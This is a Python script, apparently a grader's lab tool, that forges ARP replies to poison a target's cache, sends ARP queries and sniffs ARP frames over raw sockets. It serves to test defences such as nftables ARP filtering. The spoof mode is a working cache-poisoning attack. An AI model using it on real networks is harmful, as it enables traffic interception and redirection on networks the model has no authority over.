#!/usr/bin/env python3
# arp_probe
# -------------------------------------------------
# Stand-alone ARP probe run inside a lab container by the grader (see install_arp_probe() /
# the command builders in lib/arp.py).  Standard library only (AF_PACKET raw sockets).
#
# usage: arp_probe.py <urlsafe-base64 of a JSON spec>
#
# Three modes, one JSON spec each:
#
#   spoof  — send one or more forged ARP replies (cache poisoning demonstration / test):
#            claim that `claim_ip` is at `as_mac`, sent to `target_ip` (ethernet unicast to
#            `target_mac`).  The ARP sender fields (what a victim caches, and what an
#            `nft arp` rule matches with `arp saddr ether`) carry `as_mac` / `claim_ip`.
#       {"mode": "spoof", "iface": "eth0", "claim_ip": "...", "as_mac": "aa:bb:...",
#        "target_ip": "...", "target_mac": "aa:bb:...", "count": 3, "interval": 0.2,
#        "op": "reply"}
#
#   query  — send one ARP request (who-has `target_ip`) and report the replies received:
#       {"mode": "query", "iface": "eth0", "target_ip": "...", "sender_ip": "0.0.0.0",
#        "wait": 2.0}
#
#   sniff  — capture the ARP frames seen on the interface for `seconds`:
#       {"mode": "sniff", "iface": "eth0", "seconds": 5.0}
#
# Everything the spec carries must depend on lab data only, so the grader runs the same
# command on every evaluation pass.  No lease, no state is ever committed on the victim
# beyond the single forged reply, which the grader undoes by flushing the victim's cache.
#
# Always prints one JSON document on stdout and exits 0:
#   {"errors": [...], "result": {...}}
import base64
import json
import socket
import struct
import sys
import time

ETH_P_ARP = 0x0806
ETH_P_ALL = 0x0003
ARP_HTYPE_ETHERNET = 0x0001
ARP_PTYPE_IPV4 = 0x0800
ARP_HLEN = 6
ARP_PLEN = 4
ARP_OPS = {1: 'request', 2: 'reply'}
OP_CODES = {'request': 1, 'reply': 2}
BROADCAST = b'\xff' * 6
ZERO_MAC = b'\x00' * 6
DEFAULT_COUNT = 3
DEFAULT_INTERVAL = 0.2
DEFAULT_WAIT = 2.0
DEFAULT_SECONDS = 5.0


def _mac_bytes(mac):
    return bytes(int(x, 16) for x in str(mac).replace('-', ':').split(':'))


def _mac_str(raw):
    return ':'.join(f'{b:02x}' for b in raw)


def build_arp(op, src_mac, sender_mac, sender_ip, target_mac, target_ip, dst_mac):
    """Return the Ethernet frame of an ARP packet.

    *dst_mac* / *src_mac* are the Ethernet header addresses; *sender_mac* / *sender_ip* and
    *target_mac* / *target_ip* the ARP payload fields.  For a poisoning reply the sender fields
    carry the spoofed binding (claimed IP at the attacker's MAC).
    """
    eth = dst_mac + src_mac + struct.pack('!H', ETH_P_ARP)
    arp = struct.pack('!HHBBH', ARP_HTYPE_ETHERNET, ARP_PTYPE_IPV4, ARP_HLEN, ARP_PLEN, op)
    arp += sender_mac + socket.inet_aton(sender_ip)
    arp += target_mac + socket.inet_aton(target_ip)
    frame = eth + arp
    if len(frame) < 60:                         # pad to the minimum Ethernet frame size
        frame += b'\x00' * (60 - len(frame))
    return frame


def parse_arp(frame):
    """Decode an Ethernet frame holding an ARP packet; return a dict, or None for anything else."""
    try:
        if len(frame) < 14 + 28 or struct.unpack('!H', frame[12:14])[0] != ETH_P_ARP:
            return None
        htype, ptype, hlen, plen, op = struct.unpack('!HHBBH', frame[14:22])
        if ptype != ARP_PTYPE_IPV4 or hlen != ARP_HLEN or plen != ARP_PLEN:
            return None
        return {
            'operation': ARP_OPS.get(op, str(op)),
            'eth_src': _mac_str(frame[6:12]),
            'eth_dst': _mac_str(frame[0:6]),
            'sender_mac': _mac_str(frame[22:28]),
            'sender_ip': socket.inet_ntoa(frame[28:32]),
            'target_mac': _mac_str(frame[32:38]),
            'target_ip': socket.inet_ntoa(frame[38:42]),
        }
    except (struct.error, IndexError, OSError):
        return None


def _open(iface, proto):
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(proto))
    sock.bind((iface, socket.htons(proto)))
    return sock


def do_spoof(spec, errors):
    iface = spec['iface']
    as_mac = _mac_bytes(spec['as_mac'])
    target_mac = _mac_bytes(spec['target_mac'])
    op = OP_CODES.get(spec.get('op', 'reply'), 2)
    count = int(spec.get('count', DEFAULT_COUNT))
    interval = float(spec.get('interval', DEFAULT_INTERVAL))
    sock = _open(iface, ETH_P_ARP)
    try:
        frame = build_arp(op, as_mac, as_mac, spec['claim_ip'], target_mac, spec['target_ip'], target_mac)
        for n in range(count):
            sock.send(frame)
            if n + 1 < count:
                time.sleep(interval)
        return {'sent': count, 'claim_ip': spec['claim_ip'], 'as_mac': _mac_str(as_mac),
                'target_ip': spec['target_ip'], 'target_mac': _mac_str(target_mac), 'op': ARP_OPS.get(op, str(op))}
    finally:
        sock.close()


def do_query(spec, errors):
    iface = spec['iface']
    target_ip = spec['target_ip']
    sender_ip = spec.get('sender_ip', '0.0.0.0')
    wait = float(spec.get('wait', DEFAULT_WAIT))
    sock = _open(iface, ETH_P_ARP)
    try:
        src_mac = sock.getsockname()[4][:6]
        frame = build_arp(1, src_mac, src_mac, sender_ip, ZERO_MAC, target_ip, BROADCAST)
        sock.send(frame)
        replies, start = [], time.monotonic()
        while True:
            remaining = wait - (time.monotonic() - start)
            if remaining <= 0:
                break
            sock.settimeout(remaining)
            try:
                reply = parse_arp(sock.recv(65535))
            except socket.timeout:
                break
            if reply and reply['operation'] == 'reply' and reply['sender_ip'] == target_ip:
                replies.append(reply)
        return {'target_ip': target_ip, 'src_mac': _mac_str(src_mac), 'replies': replies}
    finally:
        sock.close()


def do_sniff(spec, errors):
    iface = spec['iface']
    seconds = float(spec.get('seconds', DEFAULT_SECONDS))
    sock = _open(iface, ETH_P_ARP)
    frames, start = [], time.monotonic()
    try:
        while True:
            remaining = seconds - (time.monotonic() - start)
            if remaining <= 0:
                break
            sock.settimeout(remaining)
            try:
                frame = parse_arp(sock.recv(65535))
            except socket.timeout:
                break
            if frame:
                frames.append(frame)
        return {'frames': frames}
    finally:
        sock.close()


MODES = {'spoof': do_spoof, 'query': do_query, 'sniff': do_sniff}


def main(argv):
    errors, result = [], {}
    try:
        spec = json.loads(base64.urlsafe_b64decode(argv[1]))
        handler = MODES.get(spec.get('mode'))
        if handler is None:
            errors.append(f"unknown mode {spec.get('mode')!r}")
        else:
            result = handler(spec, errors)
    except Exception as e:  # the grader needs a JSON document whatever happens
        errors.append(f"{type(e).__name__}: {e}")
    print(json.dumps({'errors': errors, 'result': result}, sort_keys=True))
    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))
